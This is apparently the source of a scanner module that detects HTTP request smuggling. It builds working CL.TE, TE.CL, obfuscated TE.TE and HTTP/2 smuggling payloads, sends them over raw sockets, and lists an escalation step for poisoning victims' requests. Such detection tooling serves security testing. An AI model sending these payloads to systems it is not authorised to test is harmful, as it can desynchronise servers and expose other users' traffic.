"""
RequestSmugglingScanner — HTTP request smuggling detection via raw TCP.

Lifecycle:
  DETECTED:   Single probe shows response desync (4xx vs 200, or body diff)
  VALIDATED:  Second independent probe confirms the desync
  EXPLOITABLE: Desync proven with a smuggled prefix affecting next request
  VERIFIED:   (Not applicable — no OOB or browser path for smuggling)

Covers:
  - CL.TE (Content-Length vs Transfer-Encoding)
  - TE.CL (Transfer-Encoding vs Content-Length)
  - TE.TE obfuscation (header variant confusion)
  - H2.TE / H2.CL (HTTP/2 downgrade smuggling via httpx)

Maturity: Level 3 (validated via dual-probe)
"""

import re
import socket
import ssl
import time
from urllib.parse import urlparse

from models.finding import Finding
from models.evidence import (
    HttpRequestEvidence,
    ResponseDiffEvidence,
)
from modules.utils import (
    finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

SMUGGLING_VARIANTS = {
    "cl.te": {
        "name": "CL.TE",
        "description": "Front-end uses Content-Length, back-end uses Transfer-Encoding",
    },
    "te.cl": {
        "name": "TE.CL",
        "description": "Front-end uses Transfer-Encoding, back-end uses Content-Length",
    },
    "te.te_obf_1": {
        "name": "TE.TE (obfuscated header)",
        "description": "Transfer-Encoding: xchunked\\r\\n to confuse one parser",
    },
    "te.te_obf_2": {
        "name": "TE.TE (space before colon)",
        "description": "Transfer-Encoding : chunked to confuse one parser",
    },
    "te.te_obf_3": {
        "name": "TE.TE (hop-by-hop)",
        "description": "Transfer-Encoding: x\\r\\nTransfer-Encoding: chunked to confuse one parser",
    },
    "te.te_obf_4": {
        "name": "TE.TE (capitalisation)",
        "description": "Transfer-encoding: chunked (case difference)",
    },
    "te.te_obf_5": {
        "name": "TE.TE (identity trailer)",
        "description": "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity to confuse one parser",
    },
}


def _build_smuggle_payload(variant: str, host: str, smuggle_path: str = "/smuggle-test") -> bytes:
    """Build raw HTTP smuggling payload for the given variant."""
    smuggle_request = (
        f"GET {smuggle_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 5\r\n"
        f"\r\n"
        f"x=1\r\n"
    )

    if variant == "cl.te":
        # CL specifies short body, TE processes chunked body → smuggled prefix
        body = "0\r\n\r\n" + smuggle_request
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
        )
        return headers.encode() + body.encode()

    elif variant == "te.cl":
        # TE is processed by front-end, CL ignored
        body_chunk = "0\r\n\r\n" + smuggle_request
        chunk_size = hex(len(body_chunk))[2:]
        full_body = chunk_size + "\r\n" + body_chunk + "\r\n0\r\n\r\n"
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {len(full_body) - len(body_chunk)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
        )
        return headers.encode() + full_body.encode()

    elif variant == "te.te_obf_1":
        body_chunk = "0\r\n\r\n" + smuggle_request
        chunk_size = hex(len(body_chunk))[2:]
        full_body = chunk_size + "\r\n" + body_chunk + "\r\n0\r\n\r\n"
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: xchunked\r\n"
            f"Content-Length: {len(full_body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
        )
        return headers.encode() + full_body.encode()

    elif variant == "te.te_obf_2":
        body_chunk = "0\r\n\r\n" + smuggle_request
        chunk_size = hex(len(body_chunk))[2:]
        full_body = chunk_size + "\r\n" + body_chunk + "\r\n0\r\n\r\n"
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding : chunked\r\n"
            f"Content-Length: {len(full_body)}\r\n"
            f"\r\n"
        )
        return headers.encode() + full_body.encode()

    elif variant == "te.te_obf_3":
        body_chunk = "0\r\n\r\n" + smuggle_request
        chunk_size = hex(len(body_chunk))[2:]
        full_body = chunk_size + "\r\n" + body_chunk + "\r\n0\r\n\r\n"
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: x\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: {len(full_body)}\r\n"
            f"\r\n"
        )
        return headers.encode() + full_body.encode()

    elif variant == "te.te_obf_4":
        body_chunk = "0\r\n\r\n" + smuggle_request
        chunk_size = hex(len(body_chunk))[2:]
        full_body = chunk_size + "\r\n" + body_chunk + "\r\n0\r\n\r\n"
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-encoding: chunked\r\n"
            f"Content-Length: {len(full_body)}\r\n"
            f"\r\n"
        )
        return headers.encode() + full_body.encode()

    elif variant == "te.te_obf_5":
        body_chunk = "0\r\n\r\n" + smuggle_request
        chunk_size = hex(len(body_chunk))[2:]
        full_body = chunk_size + "\r\n" + body_chunk + "\r\n0\r\n\r\n"
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Transfer-Encoding: identity\r\n"
            f"Content-Length: {len(full_body)}\r\n"
            f"\r\n"
        )
        return headers.encode() + full_body.encode()

    return b""


def _build_innocent_request(host: str, path: str = "/") -> bytes:
    """Build a simple innocent GET request to use as follow-up probe."""
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()


def _recv_response(sock: socket.socket, timeout_val: float = 10.0) -> tuple[int, dict, str]:
    """Receive an HTTP response from a socket. Returns (status_code, headers, body)."""
    sock.settimeout(timeout_val)
    data = b""
    try:
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                header_end = data.index(b"\r\n\r\n") + 4
                header_part = data[:header_end].decode("utf-8", errors="replace")
                content_length = 0
                for line in header_part.split("\r\n"):
                    if line.lower().startswith("content-length:"):
                        try:
                            content_length = int(line.split(":", 1)[1].strip())
                        except ValueError:
                            pass
                        break
                if content_length > 0:
                    body_start = header_end
                    body_received = len(data) - body_start
                    if body_received >= content_length:
                        break
                else:
                    if data.count(b"\r\n\r\n") > 1:
                        break
                    if len(data) > 8192:
                        break
                continue
    except socket.timeout:
        pass
    except Exception:
        pass

    if not data:
        return 0, {}, ""

    header_end = data.find(b"\r\n\r\n")
    if header_end == -1:
        return 0, {}, data.decode("utf-8", errors="replace")[:500]

    header_part = data[:header_end].decode("utf-8", errors="replace")
    body = data[header_end + 4:].decode("utf-8", errors="replace")

    status_code = 0
    status_match = re.match(r"HTTP/1\.\d\s+(\d+)", header_part)
    if status_match:
        status_code = int(status_match.group(1))

    headers: dict[str, str] = {}
    for line in header_part.split("\r\n")[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()

    return status_code, headers, body


def _open_socket(host: str, port: int, use_ssl: bool, timeout_val: float = 10.0) -> socket.socket | None:
    """Open a TCP (and optionally SSL) socket to the target."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout_val)
        sock.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    except (socket.timeout, socket.error, ssl.SSLError) as exc:
        log(f"  [Smuggling] Socket error connecting to {host}:{port} — {exc}",
            Colors.WHITE, verbose_only=True, verbose=False)
        return None


class RequestSmugglingScanner(ScannerBase):
    SCANNER_NAME = "smuggling"
    SCANNER_MATURITY = 3
    TARGET_LEVEL = True

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._probe_results: list[dict] = []
        self._smuggle_path = "/smuggle-test-hunter"

    # ── Lifecycle ───────────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        for variant_key in SMUGGLING_VARIANTS:
            result = self._test_variant(host, port, use_ssl, variant_key, path)
            if result:
                return DetectionResult(
                    url=url,
                    parameter=variant_key,
                    payload=variant_key,
                    context=f"smuggling_{variant_key}",
                    raw_response=result,
                    evidence_signals=["smuggling_detected", variant_key],
                )
        return None

    def validate(self, detection: DetectionResult) -> ValidationResult | None:
        if not detection or not detection.raw_response:
            return ValidationResult(confirmed=False)
        raw = detection.raw_response
        baseline = raw.get("baseline_status", 0)
        probe1 = raw.get("probe1_status", 0)
        probe2 = raw.get("probe2_status", 0)

        signals: list[str] = []
        if detection.evidence_signals:
            signals = detection.evidence_signals[:]

        if probe1 != baseline and probe2 != baseline:
            detail = f"Consistent desync: baseline={baseline}, probe1={probe1}, probe2={probe2}"
            return ValidationResult(
                confirmed=True,
                signals=signals,
                method="dual_probe",
                detail=detail,
            )
        if probe1 != baseline or probe2 != baseline:
            detail = f"Single desync: baseline={baseline}, probe1={probe1}, probe2={probe2}"
            return ValidationResult(
                confirmed=True,
                signals=signals,
                method="single_probe",
                detail=detail,
            )

        return ValidationResult(confirmed=False)

    def collect_evidence(self, result) -> list:
        ev_list: list = []
        raw = getattr(result, "raw_response", None) if hasattr(result, "raw_response") else None
        if isinstance(result, dict):
            raw = result.get("raw_response", raw)
        if not raw:
            return ev_list

        host = raw.get("host", "")
        port = raw.get("port", 80)
        use_ssl = raw.get("use_ssl", False)
        scheme = "https" if use_ssl else "http"
        variant = raw.get("variant", "unknown")

        # Smuggled request evidence
        payload = raw.get("payload", b"")
        if isinstance(payload, bytes):
            payload_str = payload.decode("utf-8", errors="replace")
        else:
            payload_str = str(payload)
        req_ev = HttpRequestEvidence(
            method="POST",
            url=f"{scheme}://{host}:{port}/",
            headers={"Host": host, "Transfer-Encoding": "chunked", "Content-Length": "..."},
            body=payload_str[:2000],
            curl_command=_build_curl("POST", f"{scheme}://{host}:{port}/",
                                     {"Host": host}),
            description=f"HTTP request smuggling probe ({variant})",
        )
        ev_list.append(req_ev)

        # Response diff evidence
        baseline_status = raw.get("baseline_status", 0)
        probe1_status = raw.get("probe1_status", 0)
        probe2_status = raw.get("probe2_status", 0)

        resp_ev = ResponseDiffEvidence(
            baseline_status=baseline_status,
            baseline_body_excerpt=f"Expected status {baseline_status} (normal request)",
            triggered_status=probe1_status,
            triggered_body_excerpt=f"Probe 1 returned status {probe1_status}",
            content_length_diff=abs(probe1_status - (baseline_status or 200)) * 100,
            trigger_param=variant,
            description=f"Response desync: baseline={baseline_status}, after smuggle={probe1_status}",
        )
        ev_list.append(resp_ev)

        if probe2_status != baseline_status:
            resp_ev2 = ResponseDiffEvidence(
                baseline_status=baseline_status,
                baseline_body_excerpt=f"Expected status {baseline_status} (normal request)",
                triggered_status=probe2_status,
                triggered_body_excerpt=f"Probe 2 returned status {probe2_status}",
                content_length_diff=abs(probe2_status - (baseline_status or 200)) * 100,
                trigger_param=variant,
                description=f"Response desync (probe 2): baseline={baseline_status}, after smuggle={probe2_status}",
            )
            ev_list.append(resp_ev2)

        return ev_list

    def generate_reproduction(self, result=None) -> list[str]:
        raw = getattr(result, "raw_response", None) if hasattr(result, "raw_response") else None
        if isinstance(result, dict):
            raw = result.get("raw_response", raw)
        variant = ""
        host = ""
        if raw:
            variant = raw.get("variant", "")
            host = raw.get("host", "")

        return [
            f"Open raw TCP connection to {host}:80 (or 443 for HTTPS)",
            f"Send smuggled payload for variant '{variant}': CL.TE, TE.CL, or TE.TE obfuscation",
            "Follow with an innocent GET request on the same connection",
            "If the innocent request returns a 404, 4xx, or unexpected body, smuggling is confirmed",
            "Escalate: chain with stored XSS or CSRF to poison victim requests through the front-end",
        ]

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        targets = self.recon.get("urls", []) if target_urls is None else target_urls

        if not targets:
            base = self.base_url
            if base:
                targets = [base]

        for url in targets:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                host = parsed.hostname or ""
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
                use_ssl = parsed.scheme == "https"
                path = parsed.path or "/"

                self._run_variants(host, port, use_ssl, url, path)
            except Exception as e:
                log(f"  [Smuggling] Error scanning {url}: {e}",
                    Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    # ── Internal helpers ────────────────────────────────────────────────

    def _test_variant(self, host: str, port: int, use_ssl: bool,
                      variant: str, path: str) -> dict | None:
        """Test a single smuggling variant. Returns result dict or None."""
        payload = _build_smuggle_payload(variant, host, self._smuggle_path)
        if not payload:
            return None

        innocent = _build_innocent_request(host, path)

        for attempt in range(2):
            sock = _open_socket(host, port, use_ssl, self.timeout)
            if sock is None:
                continue
            try:
                # Send baseline innocent request
                sock.sendall(innocent)
                base_status, _, _ = _recv_response(sock, self.timeout)

                sock.sendall(payload)
                time.sleep(0.3)
                sock.sendall(innocent)
                probe1_status, probe1_headers, probe1_body = _recv_response(sock, self.timeout)

                sock.sendall(innocent)
                probe2_status, probe2_headers, probe2_body = _recv_response(sock, self.timeout)

                if probe1_status != base_status or probe2_status != base_status:
                    result = {
                        "variant": variant,
                        "host": host,
                        "port": port,
                        "use_ssl": use_ssl,
                        "payload": payload,
                        "baseline_status": base_status,
                        "probe1_status": probe1_status,
                        "probe1_body": probe1_body[:500],
                        "probe2_status": probe2_status,
                        "probe2_body": probe2_body[:500],
                        "detected": True,
                    }
                    return result

                # Check body for smuggle-test path evidence
                if "smuggle-test" in probe1_body or "smuggle-test" in probe2_body:
                    result = {
                        "variant": variant,
                        "host": host,
                        "port": port,
                        "use_ssl": use_ssl,
                        "payload": payload,
                        "baseline_status": base_status,
                        "probe1_status": probe1_status,
                        "probe1_body": probe1_body[:500],
                        "probe2_status": probe2_status,
                        "probe2_body": probe2_body[:500],
                        "detected": True,
                    }
                    return result

            except Exception:
                continue
            finally:
                try:
                    sock.close()
                except Exception:
                    pass

        return None

    def _run_variants(self, host: str, port: int, use_ssl: bool,
                      url: str, path: str) -> None:
        """Run all smuggling variants against the target."""
        tested: list[str] = []
        confirmed: list[dict] = []

        for variant_key in SMUGGLING_VARIANTS:
            variant_meta = SMUGGLING_VARIANTS[variant_key]
            result = self._test_variant(host, port, use_ssl, variant_key, path)
            if result:
                tested.append(variant_key)
                confirmed.append(result)

        if not confirmed:
            return

        best = confirmed[0]
        variant_key = best["variant"]
        detection = DetectionResult(
            url=url,
            parameter=variant_key,
            payload=variant_key,
            context=f"smuggling_{variant_key}",
            raw_response=best,
            evidence_signals=["smuggling_detected", variant_key],
        )
        validation_result = self.validate(detection)

        scheme = "https" if use_ssl else "http"
        target_str = f"{scheme}://{host}:{port}"

        var_names = []
        for c in confirmed:
            v = c.get("variant", "")
            if v in SMUGGLING_VARIANTS:
                var_names.append(SMUGGLING_VARIANTS[v]["name"])
            else:
                var_names.append(v)

        details_parts = [
            f"HTTP request smuggling confirmed via {', '.join(set(var_names))}",
            f"Tested {len(confirmed)} variant(s) out of {len(SMUGGLING_VARIANTS)}",
        ]
        if validation_result and validation_result.confirmed:
            details_parts.append(f"Validation: {validation_result.detail}")

        evidence_list = self.collect_evidence(best)
        for ev in evidence_list:
            self.evidence_engine.store(ev)

        stage = VerificationStage.VALIDATED.value if (validation_result and validation_result.confirmed) else VerificationStage.DETECTED.value

        f = finding(
            vuln_type="HTTP Request Smuggling",
            url=target_str,
            severity="critical",
            details="; ".join(details_parts),
            evidence=f"Smuggling variants confirmed: {', '.join(var_names)}",
            request=_build_curl("POST", f"{scheme}://{host}:{port}/",
                                {"Host": host, "Transfer-Encoding": "chunked",
                                 "Content-Length": "..."},
                                cookies=None),
            response_excerpt=f"Baseline={best.get('baseline_status')}, "
                             f"Probe1={best.get('probe1_status')}, "
                             f"Probe2={best.get('probe2_status')}",
            steps_to_reproduce=self.generate_reproduction(detection),
            verification_stage=stage,
            parameter=variant_key,
        )

        if f:
            self._enrich_finding(f, len(evidence_list), f["verification_stage"])
            if self._add_finding(f):
                fingerprint = f.get("fingerprint", "")
                if fingerprint and self.evidence_engine is not None:
                    for ev in evidence_list:
                        self.evidence_engine.link_to_finding(ev, fingerprint)

    def _test_h2_smuggling(self, host: str, port: int, use_ssl: bool) -> dict | None:
        """Attempt HTTP/2 downgrade smuggling using httpx if available."""
        try:
            import httpx
        except ImportError:
            return None

        scheme = "https" if use_ssl else "http"
        target_url = f"{scheme}://{host}:{port}/"

        try:
            client = httpx.Client(http2=True, verify=False, timeout=self.timeout)
            with client:
                smuggle_body = (
                    "GET /smuggle-test HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    "\r\n"
                )
                headers = {
                    "Host": host,
                    "Content-Length": str(len(smuggle_body)),
                    "Transfer-Encoding": "chunked",
                }
                resp = client.post(target_url, headers=headers, content=smuggle_body)
                if resp.status_code not in (200, 204, 301, 302, 404):
                    return {
                        "variant": "h2.te",
                        "host": host,
                        "port": port,
                        "use_ssl": use_ssl,
                        "payload": smuggle_body.encode(),
                        "baseline_status": 200,
                        "probe1_status": resp.status_code,
                        "probe2_status": resp.status_code,
                        "detected": True,
                    }

                resp2 = client.get(target_url)
                if "smuggle-test" in resp2.text:
                    return {
                        "variant": "h2.te",
                        "host": host,
                        "port": port,
                        "use_ssl": use_ssl,
                        "payload": smuggle_body.encode(),
                        "baseline_status": 200,
                        "probe1_status": resp2.status_code,
                        "probe2_status": resp2.status_code,
                        "detected": True,
                    }
        except Exception:
            pass

        return None
